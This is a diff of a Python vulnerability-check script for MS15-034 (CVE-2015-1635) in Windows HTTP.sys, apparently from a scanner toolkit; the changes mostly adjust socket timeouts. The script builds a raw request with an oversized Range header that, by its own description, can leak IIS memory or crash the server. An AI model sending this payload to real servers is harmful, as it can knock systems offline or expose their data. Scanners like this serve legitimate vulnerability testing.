@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 '''
-name: ms15_034 http.sys远程代码执行
+name: ms15_034 http.sys远程代码执行(CVE-2015-1635)
 referer: http://www.myhack58.com/Article/html/3/62/2015/61431.htm
 author: Lucifer
 description: 利用HTTP.sys的安全漏洞，攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃，一定条件下可导致远程代码执行。
@@ -12,7 +12,6 @@ import warnings
 import socket
 from termcolor import cprint
 from urllib.parse import urlparse
-socket.setdefaulttimeout(10)
 
 class iis_ms15034_httpsys_rce_BaseVerify:
     def __init__(self, url):
@@ -24,10 +23,12 @@ class iis_ms15034_httpsys_rce_BaseVerify:
         flag = host.find(":")
         if flag != -1:
             host = host[:flag]
+
         try:
             port = 80
             request = "GET / HTTP/1.1\r\nHost: %s\r\nRange: bytes=18-18446744073709551615\r\n\r\n"%host
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(6)
             if r"https" in self.url:
                 sock = ssl.wrap_socket(sock)
             sock.connect((host, port))
